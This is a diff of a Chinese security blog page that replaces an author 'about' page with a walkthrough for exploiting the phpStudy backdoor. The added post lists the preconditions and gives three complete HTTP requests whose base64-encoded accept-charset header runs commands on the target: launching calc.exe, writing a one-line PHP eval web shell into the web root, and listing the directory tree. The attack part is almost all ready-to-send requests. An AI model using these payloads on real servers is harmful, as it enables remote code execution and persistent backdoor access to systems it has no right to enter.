@@ -88,42 +88,83 @@
 <div class="mask" onclick="closeMenu()">
 </div>
       <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
-        <h1 class="text-3xl font-bold lg:mt-16">关于</h1>
+        <h1 class="text-3xl font-bold lg:mt-16">phpstudy后门利用方法及getshell</h1>
         <div class="text-sm text-gray-700 lg:my-8">
-          2019-01-25 / 1 min read
+          2019-09-24 / 3 min read
         </div>
         
-          <img class="post-feature-image rounded-lg mx-auto my-4" src="http://www.svenbeast.com//post-images/about.jpg" alt="">
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="http://www.svenbeast.com//post-images/2OBQlt_Ta.png" alt="">
         
         <div class="post-content yue">
-          <p>😄 svenbeast<br>
-🙃 18年正式进入安全厂商<br>
-🤣 目前在某信做着安服工作，为自己加油~<br>
-🥰 希望通过不断学习和分享让自己变成更优秀的Super Man~</p>
-<blockquote>
-<p>北京的小伙伴有机会可以来面基，vx:meng56392</p>
-</blockquote>
+          <p>###0x01 phpstudy利用方法</p>
+<ul>
+<li>请求任意后缀为php的文件</li>
+<li>目标环境为php5.2,5.4,且不能为nts</li>
+<li>存在Accept-Encoding: gzip,deflate</li>
+<li>此处填写base64加密后的payload：accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw</li>
+</ul>
+<pre><code>GET /phpinfo.php HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Sec-Fetch-Site: none,
+accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw
+Accept-Encoding: gzip,deflate
+Accept-Language: zh-CN,zh;q=0.9
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1569315041105.png" alt=""></figure>
+<p>###0x02 getshell 远程连接<br>
+system('echo ^&lt;?php @eval($_POST[&quot;shell&quot;])?^&gt;&gt;PHPTutorial\WWW\shell.php');<br>
+↓<br>
+c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZWxsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs=</p>
+<pre><code>GET /phpinfo.php HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Sec-Fetch-Site: none,
+accept-charset: c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZWxsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs=
+Accept-Encoding: gzip,deflate
+Accept-Language: zh-CN,zh;q=0.9
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1569316391812.png" alt=""></figure>
+<p>###0x03 可能会遇到的问题</p>
+<ul>
+<li>若无法成功连接，可能生成目录不对，执行命令tree /f查看文件树，找到可访问路径生成shell</li>
+</ul>
+<pre><code>GET /phpinfo.php HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Sec-Fetch-Site: none,
+accept-charset: c3lzdGVtKCd0cmVlIC9mJyk7
+Accept-Encoding: gzip,deflate
+Accept-Language: zh-CN,zh;q=0.9
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1569316868542.png" alt=""></figure>
 
         </div>
 
-        
-          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="http://www.svenbeast.com//tag/IVn8EkeWs">
-            <span class="flex-auto">学习</span>
-          </a>
-        
-          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="http://www.svenbeast.com//tag/V9gIO3BPO5">
-            <span class="flex-auto">分享</span>
-          </a>
-        
-          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="http://www.svenbeast.com//tag/P8jNZE_I-">
-            <span class="flex-auto">sven</span>
-          </a>
         
 
 
         <div class="flex justify-between py-8">
           
 
+          
+            <div class="next-post">
+              <a href="http://www.svenbeast.com//post/9rcdl83tA">
+                <h3 class="post-title">
+                  泛微e-cology OA Beanshell组件远程代码执行(复现及POC)
+                  <i class="remixicon-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
           
         </div>
 
